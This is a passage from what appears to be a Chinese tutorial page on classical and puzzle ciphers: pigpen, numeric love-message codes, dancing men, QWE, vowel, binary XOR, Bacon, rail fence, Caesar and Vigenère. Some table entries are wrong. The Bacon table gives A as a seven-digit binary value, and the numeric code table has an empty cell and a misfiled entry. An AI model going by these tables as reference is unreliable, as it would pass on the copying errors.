·</td></tr><tr><td align="center">K(邀请发射信号)</td><td align="center"><strong>- · -</strong></td><td align="center">(同样)</td><td align="center">· ·  · ·</td></tr><tr><td align="center">SK(终止，联络结束)</td><td align="center"><strong>· · · - · -</strong></td><td align="center">(错误)</td><td align="center">· · · · · · · ·</td></tr></tbody></table><h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2><p>​        猪圈密码(Pigpen Cipher)，亦称<strong>朱高密码</strong>、<strong>共济会暗号</strong>、<strong>共济会密码</strong>或<strong>共济会员密码</strong>，是一种以格子为基础的简单<strong>替代式密码</strong>。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。</p><p><strong>猪圈密码的替换规则如下所示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/猪圈密码(基础).png" alt="猪圈密码(基础)"></center><center>图1 猪圈密码(基础)</center><p><strong>猪圈密码变种1：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/猪圈密码(变种1).png" alt="猪圈密码(变种1)"></center><center>图2 猪圈密码(变种1)</center><p><strong>猪圈密码变种2：</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/猪圈密码(变种2).png" alt="猪圈密码(变种2)"></center><center>图3 猪圈密码(变种2)</center><h2 id="数字密码"><a href="#数字密码" class="headerlink" title="数字密码"></a>数字密码</h2><p>​        俗话说得好：“凡事都要做到心中有数”。数字的每一次变化都在隐性或显性地改变着我们的社会，改变着我们的生活。通过对这些数字的再认识，可以进一步了解我们的历史、认识我们的社会、拓展我们的生活。在“数字化的时代”，我们应该养成关注数字的良好习惯，在数字上多下工夫，力求让非物质文化尽快转化为物质文化。 《数字密码》不是简单地列举数字，而是通过数说数字的影响力还原其本来面目。</p><p><strong>0字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">019425</td><td align="center">你依旧是爱我</td></tr><tr><td align="center">02746</td><td align="center">你恶心死了</td></tr><tr><td align="center">02825</td><td align="center">你爱不爱我</td></tr><tr><td align="center">03456</td><td align="center">你相思无用</td></tr><tr><td align="center">0437</td><td align="center">你是神经</td></tr><tr><td align="center">04517</td><td align="center">你是我氧气</td></tr><tr><td align="center">04527</td><td align="center">你是我爱妻</td></tr><tr><td align="center">04535</td><td align="center">你是否想我</td></tr><tr><td align="center">04551</td><td align="center">你是我唯一</td></tr><tr><td align="center">0456</td><td align="center">你是我的</td></tr><tr><td align="center">04567</td><td align="center">你是我老妻</td></tr><tr><td align="center">0457</td><td align="center">你是我妻</td></tr><tr><td align="center">045692</td><td align="center">你是我的最爱</td></tr><tr><td align="center">0487</td><td align="center">你是白痴</td></tr><tr><td align="center">0487561</td><td align="center">你是白痴无药医</td></tr><tr><td align="center">0564335</td><td align="center">你无聊时想想我</td></tr><tr><td align="center">0594184</td><td align="center">你我就是一辈子</td></tr><tr><td align="center">065</td><td align="center">原谅我</td></tr><tr><td align="center">06537</td><td align="center">你惹我生气</td></tr><tr><td align="center">07382</td><td align="center">你欺善怕恶</td></tr><tr><td align="center">0748</td><td align="center">你去死吧</td></tr><tr><td align="center">07868</td><td align="center">你吃饱了吧</td></tr><tr><td align="center">08056</td><td align="center">你不理我啦</td></tr><tr><td align="center">0837</td><td align="center">你别生气</td></tr><tr><td align="center">08376</td><td align="center">你别生气了</td></tr><tr><td align="center">095</td><td align="center">你找我</td></tr><tr><td align="center">098</td><td align="center">你走吧</td></tr></tbody></table><p><strong>1字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">1240</td><td align="center">最爱是你</td></tr><tr><td align="center">1314</td><td align="center">一生一世</td></tr><tr><td align="center">1314925</td><td align="center">一生一世就爱我</td></tr><tr><td align="center">1372</td><td align="center">一厢情愿</td></tr><tr><td align="center">1392010</td><td align="center">一生就爱你一个</td></tr><tr><td align="center">1414</td><td align="center">意思意思</td></tr><tr><td align="center">147</td><td align="center">一世情</td></tr><tr><td align="center">1573</td><td align="center">一往情深</td></tr><tr><td align="center">1711</td><td align="center">一心一意</td></tr></tbody></table><p><strong>2字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">200</td><td align="center">爱你哦</td></tr><tr><td align="center">20110</td><td align="center">爱你 一亿年</td></tr><tr><td align="center">20160</td><td align="center">爱你一万年</td></tr><tr><td align="center">20170</td><td align="center">爱你一千年</td></tr><tr><td align="center">20184</td><td align="center">爱你一辈子</td></tr><tr><td align="center">2030999</td><td align="center">爱你想你久久久</td></tr><tr><td align="center">2037</td><td align="center">为你伤心</td></tr><tr><td align="center">20475</td><td align="center">爱你是幸福</td></tr><tr><td align="center">20609</td><td align="center">爱你到永久</td></tr><tr><td align="center">207374</td><td align="center">爱你七生七世</td></tr><tr><td align="center">20863</td><td align="center">爱你到来生</td></tr><tr><td align="center">20999</td><td align="center">爱你久久久</td></tr><tr><td align="center">220225</td><td align="center">爱爱你爱爱我</td></tr><tr><td align="center">230</td><td align="center">爱上你</td></tr><tr><td align="center">234</td><td align="center">爱相随</td></tr><tr><td align="center">235</td><td align="center">爱上我</td></tr><tr><td align="center">240</td><td align="center">爱死你</td></tr><tr><td align="center">246</td><td align="center">饿死了</td></tr><tr><td align="center">246437</td><td align="center">爱是如此神奇</td></tr><tr><td align="center">25184</td><td align="center">爱我一辈子</td></tr><tr><td align="center">25873</td><td align="center">爱我到今生</td></tr><tr><td align="center">25910</td><td align="center">爱我久一点</td></tr><tr><td align="center">259695</td><td align="center">爱我就了解我</td></tr><tr><td align="center">259758</td><td align="center">爱我就娶我吧</td></tr><tr><td align="center">2627</td><td align="center">爱来爱去</td></tr><tr><td align="center">282</td><td align="center">饿不饿</td></tr><tr><td align="center">2925184</td><td align="center">爱就爱我一辈子</td></tr><tr><td align="center">296</td><td align="center">爱走了</td></tr></tbody></table><p><strong>3字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">300</td><td align="center">想你哦</td></tr><tr><td align="center">30920</td><td align="center">想你就爱你</td></tr><tr><td align="center">309420</td><td align="center">想你就是爱你</td></tr><tr><td align="center">3013</td><td align="center">想你一生</td></tr><tr><td align="center">32012</td><td align="center">想念你的爱</td></tr><tr><td align="center">32069</td><td align="center">想爱你很久</td></tr><tr><td align="center">3207778</td><td align="center">想和你去吹吹风</td></tr><tr><td align="center">330335</td><td align="center">想想你想想我</td></tr><tr><td align="center">3344</td><td align="center">生生世世</td></tr><tr><td align="center">3399</td><td align="center">长长久久</td></tr><tr><td align="center">356</td><td align="center">上网了</td></tr><tr><td align="center">35910</td><td align="center">想我久一点</td></tr><tr><td align="center">369958</td><td align="center">神啊救救我吧</td></tr><tr><td align="center">3731</td><td align="center">真心真意</td></tr><tr><td align="center">39</td><td align="center">Thank you</td></tr></tbody></table><p><strong>4字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">440295</td><td align="center">谢谢你爱过我</td></tr><tr><td align="center">4422335</td><td align="center">时时刻刻想想我</td></tr><tr><td align="center">4457</td><td align="center">速速回机</td></tr><tr><td align="center">456</td><td align="center">是我啦</td></tr><tr><td align="center">460</td><td align="center">思念你</td></tr></tbody></table><p><strong>5字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">505</td><td align="center">SOS</td></tr><tr><td align="center">507680</td><td align="center">我一定要追你</td></tr><tr><td align="center">510</td><td align="center">我依你(我已来)</td></tr><tr><td align="center">51020</td><td align="center">我依然爱你</td></tr><tr><td align="center">51095</td><td align="center">我要你嫁我</td></tr><tr><td align="center">51396</td><td align="center">我要睡觉了</td></tr><tr><td align="center">514</td><td align="center">无意思</td></tr><tr><td align="center">515206</td><td align="center">我已不爱你了</td></tr><tr><td align="center">51620</td><td align="center">我依然爱你</td></tr><tr><td align="center">51820</td><td align="center">我已不爱你</td></tr><tr><td align="center">518720</td><td align="center">我一辈子爱你</td></tr><tr><td align="center">51920</td><td align="center">我依旧爱你</td></tr><tr><td align="center">51930</td><td align="center">我依旧想你</td></tr><tr><td align="center">520</td><td align="center">我爱你</td></tr><tr><td align="center">5201314</td><td align="center">我爱你一生一世</td></tr><tr><td align="center">52010000</td><td align="center">我爱你一万年</td></tr><tr><td align="center">5203344</td><td align="center">我爱你生生世世</td></tr><tr><td align="center"></td><td align="center">我爱你生生世世不变心</td></tr><tr><td align="center">52094</td><td align="center">我爱你到死</td></tr><tr><td align="center">521</td><td align="center">我愿意</td></tr><tr><td align="center">5230</td><td align="center">我爱上你</td></tr><tr><td align="center">5240</td><td align="center">我爱是你</td></tr><tr><td align="center">52406</td><td align="center">我爱死你了</td></tr><tr><td align="center">526</td><td align="center">我饿了</td></tr><tr><td align="center">5260</td><td align="center">我暗恋你</td></tr><tr><td align="center">530</td><td align="center">我想你</td></tr><tr><td align="center">530184</td><td align="center">我想你一辈子</td></tr><tr><td align="center">53207778</td><td align="center">我想和你去吹吹风</td></tr><tr><td align="center">53406</td><td align="center">我想死你了</td></tr><tr><td align="center">53517230</td><td align="center">我想我已经爱上你</td></tr><tr><td align="center">5366</td><td align="center">我想聊聊</td></tr><tr><td align="center">5376</td><td align="center">我生气了</td></tr><tr><td align="center">53719</td><td align="center">我深情依旧</td></tr><tr><td align="center">53770</td><td align="center">我想亲亲你</td></tr><tr><td align="center">53782</td><td align="center">我心情不好</td></tr><tr><td align="center">53880</td><td align="center">我想抱抱你</td></tr><tr><td align="center">540086</td><td align="center">我是你女朋友</td></tr><tr><td align="center">54033</td><td align="center">我是你先生</td></tr><tr><td align="center">5406</td><td align="center">我是你的</td></tr><tr><td align="center">5407</td><td align="center">我是你妻</td></tr><tr><td align="center">54064</td><td align="center">我是你老师</td></tr><tr><td align="center">54074</td><td align="center">我是你妻子</td></tr><tr><td align="center">54086</td><td align="center">我是你爸啦</td></tr><tr><td align="center">5420</td><td align="center">我只爱你</td></tr><tr><td align="center">54335</td><td align="center">无事想想我</td></tr><tr><td align="center">543720</td><td align="center">我是真心爱你</td></tr><tr><td align="center">54430</td><td align="center">我时时想你</td></tr><tr><td align="center">5452830</td><td align="center">无时无刻不想你</td></tr><tr><td align="center">546</td><td align="center">我输了</td></tr><tr><td align="center">5460</td><td align="center">我思想你</td></tr><tr><td align="center">5490</td><td align="center">我去找你</td></tr><tr><td align="center">84920</td><td align="center">我始终爱你</td></tr><tr><td align="center">554528096</td><td align="center">我无时无刻伴你左右</td></tr><tr><td align="center">555</td><td align="center">呜呜呜</td></tr><tr><td align="center">55646</td><td align="center">我无聊死了</td></tr><tr><td align="center">556520</td><td align="center">我不能不爱你</td></tr><tr><td align="center">558</td><td align="center">午午安</td></tr><tr><td align="center">55926</td><td align="center">我有多无聊</td></tr><tr><td align="center">5620</td><td align="center">我很爱你</td></tr><tr><td align="center">562059487</td><td align="center">我若爱你我就是白痴</td></tr><tr><td align="center">5630</td><td align="center">我很想你</td></tr><tr><td align="center">564335</td><td align="center">无聊时想想我</td></tr><tr><td align="center">5670</td><td align="center">我要娶你</td></tr><tr><td align="center">570</td><td align="center">我气你</td></tr><tr><td align="center">57350</td><td align="center">我只在乎你</td></tr><tr><td align="center">57386</td><td align="center">我去上班了</td></tr><tr><td align="center">57410</td><td align="center">我心属于你</td></tr><tr><td align="center">574839</td><td align="center">我其实不想走</td></tr><tr><td align="center">57520</td><td align="center">吾妻我爱你</td></tr><tr><td align="center">576</td><td align="center">我去了</td></tr><tr><td align="center">5776</td><td align="center">我出去了</td></tr><tr><td align="center">578</td><td align="center">补习班</td></tr><tr><td align="center">58</td><td align="center">晚安</td></tr><tr><td align="center">584520</td><td align="center">我发誓我爱你</td></tr><tr><td align="center">586</td><td align="center">我不来</td></tr><tr><td align="center">587</td><td align="center">我抱歉</td></tr><tr><td align="center">5871</td><td align="center">我不介意</td></tr><tr><td align="center">592</td><td align="center">我好饿</td></tr><tr><td align="center">59240</td><td align="center">我最爱是你</td></tr><tr><td align="center">59420</td><td align="center">我就是爱你</td></tr><tr><td align="center">59430</td><td align="center">我就是想你</td></tr><tr><td align="center">59520</td><td align="center">我永远爱你</td></tr><tr><td align="center">596</td><td align="center">我走了</td></tr><tr><td align="center">5976</td><td align="center">我到家了</td></tr></tbody></table><p><strong>6字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">609</td><td align="center">到永久</td></tr><tr><td align="center">6120</td><td align="center">懒得理你</td></tr><tr><td align="center">6785753</td><td align="center">老地方不见不散</td></tr><tr><td align="center">6868</td><td align="center">溜吧！溜吧！</td></tr><tr><td align="center">687</td><td align="center">对不起</td></tr></tbody></table><p><strong>7字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">70345</td><td align="center">请你相信我</td></tr><tr><td align="center">706</td><td align="center">起来吧</td></tr><tr><td align="center">70626</td><td align="center">请你留下来</td></tr><tr><td align="center">706519184</td><td align="center">请你让我依靠一辈子</td></tr><tr><td align="center">7086</td><td align="center">七零八落</td></tr><tr><td align="center">7087</td><td align="center">请你别走</td></tr><tr><td align="center">70885</td><td align="center">请你帮帮我</td></tr><tr><td align="center">721</td><td align="center">亲爱的</td></tr><tr><td align="center">729</td><td align="center">去喝酒</td></tr><tr><td align="center">7319</td><td align="center">天长地久</td></tr><tr><td align="center">737420</td><td align="center">今生今世爱你</td></tr><tr><td align="center">73748096</td><td align="center">今生今世伴你左右</td></tr><tr><td align="center">73807</td><td align="center">情深怕缘浅</td></tr><tr><td align="center">740</td><td align="center">气死你</td></tr><tr><td align="center">7408695</td><td align="center">其实你不了解我</td></tr><tr><td align="center">745</td><td align="center">气死我</td></tr><tr><td align="center">745420</td><td align="center">其实我是爱你</td></tr><tr><td align="center">7474074</td><td align="center">去死去死你去死</td></tr><tr><td align="center">74839</td><td align="center">其实不想走</td></tr><tr><td align="center">756</td><td align="center">辛苦了</td></tr><tr><td align="center">765</td><td align="center">去跳舞</td></tr><tr><td align="center">7678</td><td align="center">吃饱了吗</td></tr><tr><td align="center">770880520</td><td align="center">亲亲你抱抱你我爱你</td></tr><tr><td align="center">7731</td><td align="center">心心相映</td></tr><tr><td align="center">7758520</td><td align="center">亲亲我吧我爱你</td></tr><tr><td align="center">775885</td><td align="center">亲亲我抱抱我</td></tr><tr><td align="center">77543</td><td align="center">猜猜我是谁</td></tr><tr><td align="center">77895</td><td align="center">紧紧抱着我</td></tr><tr><td align="center">786</td><td align="center">吃饱了</td></tr><tr><td align="center">7998</td><td align="center">去走走吧</td></tr></tbody></table><p><strong>8字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">8006</td><td align="center">不理你了</td></tr><tr><td align="center">8013</td><td align="center">伴你一生</td></tr><tr><td align="center">8074</td><td align="center">把你气死</td></tr><tr><td align="center">8084</td><td align="center">Baby</td></tr><tr><td align="center">809</td><td align="center">保龄球</td></tr><tr><td align="center">811176</td><td align="center">不要在一起了</td></tr><tr><td align="center">82475</td><td align="center">被爱是幸福</td></tr><tr><td align="center">825</td><td align="center">别爱我</td></tr><tr><td align="center">837</td><td align="center">别生气</td></tr><tr><td align="center">8384</td><td align="center">不三不四</td></tr><tr><td align="center">85</td><td align="center">帮我</td></tr><tr><td align="center">85941</td><td align="center">帮我告诉他</td></tr><tr><td align="center">885</td><td align="center">帮帮我</td></tr><tr><td align="center">860</td><td align="center">不留你</td></tr><tr><td align="center">865</td><td align="center">别惹我</td></tr><tr><td align="center">8716</td><td align="center">八嘎鸭路</td></tr><tr><td align="center">881</td><td align="center">拜拜哎</td></tr><tr><td align="center">8834760</td><td align="center">漫漫相思只为你</td></tr><tr><td align="center">886</td><td align="center">拜拜咯</td></tr><tr><td align="center">898</td><td align="center">分手吧</td></tr></tbody></table><p><strong>9字部</strong>：</p><table><thead><tr><th align="center">密文</th><th align="center">明文</th></tr></thead><tbody><tr><td align="center">902535</td><td align="center">求你爱我想我</td></tr><tr><td align="center">907753</td><td align="center">叫你去吃午餐</td></tr><tr><td align="center">9089</td><td align="center">求你别走</td></tr><tr><td align="center">910</td><td align="center">就依你</td></tr><tr><td align="center">918</td><td align="center">加油吧</td></tr><tr><td align="center">920</td><td align="center">好爱你</td></tr><tr><td align="center">9213</td><td align="center">钟爱一生</td></tr><tr><td align="center">930</td><td align="center">好想你</td></tr><tr><td align="center">93110</td><td align="center">好像见见你</td></tr><tr><td align="center">940194</td><td align="center">告诉你一件事</td></tr><tr><td align="center">95</td><td align="center">救我</td></tr><tr><td align="center">98</td><td align="center">久发</td></tr><tr><td align="center">987</td><td align="center">对不起</td></tr><tr><td align="center">9908875</td><td align="center">求求你别抛弃我</td></tr><tr><td align="center">995</td><td align="center">救救我</td></tr><tr><td align="center">9958</td><td align="center">救救我吧</td></tr></tbody></table><h2 id="福尔摩斯密码"><a href="#福尔摩斯密码" class="headerlink" title="福尔摩斯密码"></a>福尔摩斯密码</h2><p>​        福尔摩斯密码跳舞的小人，讲的是一个黑帮发明的一种密码，其密码就是用一个一个的跳舞的小人组成的，一个小人是一个字母。有人用这种密码进行通信，来威胁某人，福尔摩斯后来破解了这个密码，抓住了坏人。</p><p><strong>密码表</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/福尔摩斯密码(跳舞的小人密码表).jpg" alt="福尔摩斯密码(跳舞的小人密码表)"></center><center>图4.1 跳舞的小人</center><h2 id="QWE格式密码"><a href="#QWE格式密码" class="headerlink" title="QWE格式密码"></a>QWE格式密码</h2><p>​        QWE格式密码指的是电脑键盘上26个字母的顺序，是一种简单的替换密码。</p><p><strong>密码表</strong>：</p><center>表 QWE格式密码表</center><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">D</th><th align="center">E</th><th align="center">F</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">J</th><th align="center">K</th><th align="center">L</th><th align="center">M</th></tr></thead><tbody><tr><td align="center">Q</td><td align="center">W</td><td align="center">E</td><td align="center">R</td><td align="center">T</td><td align="center">Y</td><td align="center">U</td><td align="center">I</td><td align="center">O</td><td align="center">P</td><td align="center">A</td><td align="center">S</td><td align="center">D</td></tr><tr><td align="center"><strong>N</strong></td><td align="center"><strong>O</strong></td><td align="center"><strong>P</strong></td><td align="center"><strong>Q</strong></td><td align="center"><strong>R</strong></td><td align="center"><strong>S</strong></td><td align="center"><strong>T</strong></td><td align="center"><strong>U</strong></td><td align="center"><strong>V</strong></td><td align="center"><strong>W</strong></td><td align="center"><strong>X</strong></td><td align="center"><strong>Y</strong></td><td align="center"><strong>Z</strong></td></tr><tr><td align="center">F</td><td align="center">G</td><td align="center">H</td><td align="center">J</td><td align="center">K</td><td align="center">L</td><td align="center">Z</td><td align="center">X</td><td align="center">C</td><td align="center">V</td><td align="center">B</td><td align="center">N</td><td align="center">M</td></tr></tbody></table><h2 id="元音密码"><a href="#元音密码" class="headerlink" title="元音密码"></a>元音密码</h2><p>​        元音密码是一种以元音字母为界，使用替代方式来表示各个字母的密码。</p><p><strong>元音密码表</strong>：</p><center>表 元音密码表</center><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">D</th><th align="center">E</th><th align="center">F</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">J</th><th align="center">K</th><th align="center">L</th><th align="center">M</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">11</td><td align="center">12</td><td align="center">13</td><td align="center">2</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">3</td><td align="center">31</td><td align="center">32</td><td align="center">33</td><td align="center">34</td></tr><tr><td align="center"><strong>N</strong></td><td align="center"><strong>O</strong></td><td align="center"><strong>P</strong></td><td align="center"><strong>Q</strong></td><td align="center"><strong>R</strong></td><td align="center"><strong>S</strong></td><td align="center"><strong>T</strong></td><td align="center"><strong>U</strong></td><td align="center"><strong>V</strong></td><td align="center"><strong>W</strong></td><td align="center"><strong>X</strong></td><td align="center"><strong>Y</strong></td><td align="center"><strong>Z</strong></td></tr><tr><td align="center">35</td><td align="center">4</td><td align="center">41</td><td align="center">42</td><td align="center">43</td><td align="center">44</td><td align="center">45</td><td align="center">5</td><td align="center">51</td><td align="center">52</td><td align="center">53</td><td align="center">54</td><td align="center">55</td></tr></tbody></table><p><strong>eg：</strong></p><p>明文：I LOVE YOU</p><p>密文：3.33.4.51.2.54.4.5</p><p><strong>注：</strong></p><p>​        元音字母因为密文中只含有1，2，3，4，5五个数字而且时常出现个位数，因此很容易破解，有时候可以将1，2，3，4，5变为10，20，30，40，50等，也可变成如同棋盘密码密文的形式来对解密者进行干扰，如下表所示。</p><center>表 元音密码扩展密码表</center><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">D</th><th align="center">E</th><th align="center">F</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">J</th><th align="center">K</th><th align="center">L</th><th align="center">M</th></tr></thead><tbody><tr><td align="center">10</td><td align="center">11</td><td align="center">12</td><td align="center">13</td><td align="center">20</td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">30</td><td align="center">31</td><td align="center">32</td><td align="center">33</td><td align="center">34</td></tr><tr><td align="center"><strong>N</strong></td><td align="center"><strong>O</strong></td><td align="center"><strong>P</strong></td><td align="center"><strong>Q</strong></td><td align="center"><strong>R</strong></td><td align="center"><strong>S</strong></td><td align="center"><strong>T</strong></td><td align="center"><strong>U</strong></td><td align="center"><strong>V</strong></td><td align="center"><strong>W</strong></td><td align="center"><strong>X</strong></td><td align="center"><strong>Y</strong></td><td align="center"><strong>Z</strong></td></tr><tr><td align="center">35</td><td align="center">40</td><td align="center">41</td><td align="center">42</td><td align="center">43</td><td align="center">44</td><td align="center">45</td><td align="center">50</td><td align="center">51</td><td align="center">52</td><td align="center">53</td><td align="center">54</td><td align="center">55</td></tr></tbody></table><p>则：</p><p>明文：I LOVE YOU</p><p>密文：3033405120544050</p><h2 id="费娜姆密码"><a href="#费娜姆密码" class="headerlink" title="费娜姆密码"></a>费娜姆密码</h2><p>​        费娜姆密码是一种二进制密码，使用七位二进制数代替字母，并使用异或操作对明文进行加密的方式。</p><p><strong>密码基础表</strong>：</p><center>表 字母对应的二进制表示</center><table><thead><tr><th align="center">字母</th><th align="center">二进制表示</th><th align="center">字母</th><th align="center">二进制表示</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">1000001</td><td align="center">N</td><td align="center">1001110</td></tr><tr><td align="center">B</td><td align="center">1000010</td><td align="center">O</td><td align="center">1001111</td></tr><tr><td align="center">C</td><td align="center">1000011</td><td align="center">P</td><td align="center">1010000</td></tr><tr><td align="center">D</td><td align="center">1000100</td><td align="center">Q</td><td align="center">1010001</td></tr><tr><td align="center">E</td><td align="center">1000101</td><td align="center">R</td><td align="center">1010010</td></tr><tr><td align="center">F</td><td align="center">1000110</td><td align="center">S</td><td align="center">1010011</td></tr><tr><td align="center">G</td><td align="center">1000111</td><td align="center">T</td><td align="center">1010100</td></tr><tr><td align="center">H</td><td align="center">1001000</td><td align="center">U</td><td align="center">1010101</td></tr><tr><td align="center">I</td><td align="center">1001001</td><td align="center">V</td><td align="center">1010110</td></tr><tr><td align="center">J</td><td align="center">1001010</td><td align="center">W</td><td align="center">1010111</td></tr><tr><td align="center">K</td><td align="center">1001011</td><td align="center">X</td><td align="center">1011000</td></tr><tr><td align="center">L</td><td align="center">1001100</td><td align="center">Y</td><td align="center">1011001</td></tr><tr><td align="center">M</td><td align="center">1001101</td><td align="center">Z</td><td align="center">1011010</td></tr></tbody></table><p><strong>eg:</strong></p><p>明文：hello = H E L L O = 1001000 1000101 1001100 1001100 1001111</p><p>密钥：study = S T U D Y = 1010011 1010100 1010101 1000100 1011001</p><p>密文：10010001000101100110010011001001111 $$\oplus$$ 10100111010100101010110001001011001 </p><p>​        = 00110110010001001100100010000010110</p><p><strong>解密操作：</strong></p><ol><li>划分：即每七个数字为一组；</li><li>对应：找出密钥每个字母对应的数字，再与上述数字对应；</li><li>异或：将密文与密钥进行异或操作；</li><li>替换：将新得到一组数字在密码基础表中找到对应的字母，得出明文。</li></ol><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><p>​        弗朗西斯·培根，英国人，他是第一个意识到科学技术能够改变世界面貌的哲学家。他不仅意思到这一点，而且积极投入科学技术的探索中。他对密码学的兴趣很浓厚，设计出的密码也丰富了密码学的内容。</p><p>​        他设计的密码非常独特，它可以不<strong>加过多的“雕饰”</strong>，几乎以<strong>本来的“素面”</strong>在你眼前晃过，而不会引起你的注意。</p><p>​        培根所使用的密码是一种<strong>本质上用二进制数设计</strong>的。不过，他没有用通常的0和1来表示，而是采用a和b，下面是他设计的26个英文字母二进制表示法。</p><center>表 培根密码表（5位）</center><table><thead><tr><th align="center">字母</th><th align="center">二进制表示</th><th align="center">字母</th><th align="center">二进制表示</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">1000001</td><td align="center">N</td><td align="center">abbab</td></tr><tr><td align="center">B</td><td align="center">aaaab</td><td align="center">O</td><td align="center">abbba</td></tr><tr><td align="center">C</td><td align="center">aaaba</td><td align="center">P</td><td align="center">abbbb</td></tr><tr><td align="center">D</td><td align="center">aaabb</td><td align="center">Q</td><td align="center">baaaa</td></tr><tr><td align="center">E</td><td align="center">aabaa</td><td align="center">R</td><td align="center">baaab</td></tr><tr><td align="center">F</td><td align="center">aabab</td><td align="center">S</td><td align="center">baaba</td></tr><tr><td align="center">G</td><td align="center">aabba</td><td align="center">T</td><td align="center">baabb</td></tr><tr><td align="center">H</td><td align="center">aabbb</td><td align="center">U</td><td align="center">babaa</td></tr><tr><td align="center">I</td><td align="center">abaaa</td><td align="center">V</td><td align="center">babab</td></tr><tr><td align="center">J</td><td align="center">abaab</td><td align="center">W</td><td align="center">babba</td></tr><tr><td align="center">K</td><td align="center">ababa</td><td align="center">X</td><td align="center">babbb</td></tr><tr><td align="center">L</td><td align="center">ababb</td><td align="center">Y</td><td align="center">bbaaa</td></tr><tr><td align="center">M</td><td align="center">abbaa</td><td align="center">Z</td><td align="center">bbaab</td></tr></tbody></table><p><strong>eg：</strong></p><p>明文：OK</p><p>密文：abbbaababa</p><p><strong>培根密码扩展：</strong></p><p>​        任何只有两种状态的五位组合都可以看作是培根密码的衍生。如：</p><ul><li>正体字和斜体字</li><li>宋体与仿宋</li><li>黑体与微软雅黑</li><li>…</li></ul><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><p>​        栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p><p><strong>二栏栅栏密码</strong>：</p><p><strong>加密</strong>：</p><ul><li>明文：THERE IS A CIPHER</li></ul><ol><li>明文格式化：THEREISACIPHER；</li><li>分组：TH ER EI SA CI PH ER；</li><li>提取：首字母组合：TEESCPE，尾字母组合：HRIAIHR；</li><li>拼接：TEESCPEHRIAIHR</li></ol><ul><li>密文：TEESCPEHRIAIHR</li></ul><p><strong>解密</strong>：</p><p>​        解密操作是加密的逆过程</p><p><strong>多栏栅栏密码</strong>：</p><p>​        多栏栅栏密码的解法与二栏栅栏密码相似，但有一个特点，<font color="red">栏数必须为总字符个数的公因子</font>。</p><p><strong>栅栏密码变种1：</strong></p><p>​        将所有汉字以其拼音表示，将各个拼音按<strong>声母</strong>和<strong>韵母</strong>进行分栏，按二栏栅栏密码进行加解密。</p><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>​        凯撒密码(Caesar Cipher)或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换密码，其作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过<strong>把字母移动一定的位数</strong>来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，<strong>位数</strong>就是凯撒密码加密和解密的密钥。</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>​        <strong>维吉尼亚密码</strong>(Vigenere Cipher)，又译 <strong>维热纳尔密码</strong>，是使用一系列<strong>凯撒密码</strong>组成密码字母表的加密算法，属于<strong>多表密码</strong>的一种简单形式。其密码表如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/CryptoDesc/VigenereCipherTable.png" alt="VigenereCipherTable"></center><p><strong>eg</strong>：</p><ul><li>明文(列)：TOBEO RNOTT OBETH ATIST HEQUE STION</li><li>密钥(行)：RELAT IONSR ELATI ONSRE LATIO NSREL</li><li>密文(点)：KSMEH ZBBLK SMEMP OGAJX SEJCS FLZSY</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.33iq.com/group/628/3.html" target="_blank" rel="noopener">密码小组</a></p><p><a href="http://www.360doc.com/content/15/0222/14/21874787_450053353.shtml" target="_blank" rel="noopener">二进制密码(培根密码、费娜姆密码)</a></p><p><a 